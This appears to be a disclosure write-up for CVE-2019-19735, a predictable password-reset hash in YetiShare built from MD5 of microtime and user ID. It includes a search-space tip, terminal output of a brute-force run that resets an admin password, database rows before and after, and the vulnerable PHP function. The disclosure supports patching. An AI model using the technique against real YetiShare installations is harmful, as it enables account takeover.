# CVE-2019-19735
YetiShare password reset hash bruteforce - v3.5.2 - v4.5.3. Possible to bruteforce the password reset hash due to weak hash function

The guess.php script can be modified to cover the whole microsecond span. Thanks to Andreas Gustafsson and Robin Gustafsson for pointing out that the last two digits in the microseconds from microtime() is always zero and can be skipped when incrementing.

```
user@ayu:~/Desktop$ time php guess.php 
[+] Creating range and starting attack, this can take an hour or more
[+] Got 1575725248. Testing 0.57667000 - 0.93107200 
[+] New password set: password2
real    146m14,018s
user    3m46,868s
sys 6m37,106s
```

Before and after of the user row for the admin user
```
mysql> select email, passwordResetHash, password from users;
+--------------------+----------------------------------+----------------------------------+
| email              | passwordResetHash                | password                         |
+--------------------+----------------------------------+----------------------------------+
| email@yoursite.com | cc7229f58be29db8277c483963a6fc7a | 5f4dcc3b5aa765d61d8327deb882cf99 |
+--------------------+----------------------------------+----------------------------------+
1 row in set (0.00 sec)

mysql> select email, passwordResetHash, password from users;
+--------------------+-------------------+----------------------------------+
| email              | passwordResetHash | password                         |
+--------------------+-------------------+----------------------------------+
| email@yoursite.com |                   | 6cb75f652a9b52798eb6cf2201057c73 |
+--------------------+-------------------+----------------------------------+
1 row in set (0.00 sec)
```


class.userpeer.php - row 35
```
    static function createPasswordResetHash($userId)
    {
        $user = true;

        // make sure it doesn't already exist on an account
        while ($user != false)
        {
            // create hash
            $hash = MD5(microtime() . $userId);

            // lookup by hash
            $user = self::loadUserByPasswordResetHash($hash);
        }

        // update user with hash
        $db = Database::getDatabase(true);
        $db->query('UPDATE users SET passwordResetHash = :passwordResetHash WHERE id = :id', array('passwordResetHash' => $hash, 'id'                => $userId));

        return $hash;
    }
```


